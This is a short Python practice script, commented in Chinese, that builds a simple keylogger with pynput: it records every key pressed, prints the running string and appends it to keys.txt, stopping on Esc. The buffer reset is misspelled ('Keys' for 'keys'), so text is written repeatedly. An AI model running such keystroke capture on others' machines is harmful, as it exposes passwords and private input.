
# 键盘记录器
# 目的：编写一个Python脚本，将用户按下的所有键保存在一个文本文件中。
# 提示：pynput是Python中的一个库，用于控制键盘和鼠标的移动，它也可以用于制作键盘记录器。简单地读取用户按下的键，并在一定数量的键后将它们保存在一个文本文件中。

from pynput.keyboard import Key, Controller, Listener
import time
Keyboard = Controller()

keys = []
def on_press(key):
    global keys
    
    # keys.append(str(key).replace("'", ""))
    string = str(key).replace("'", "")
    keys.append(string)
    main_string = "".join(keys)
    print(main_string)

    if len(main_string)>15:
        with open("keys.txt", "a") as f:
            f.write(main_string)
            Keys = []
                   
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()






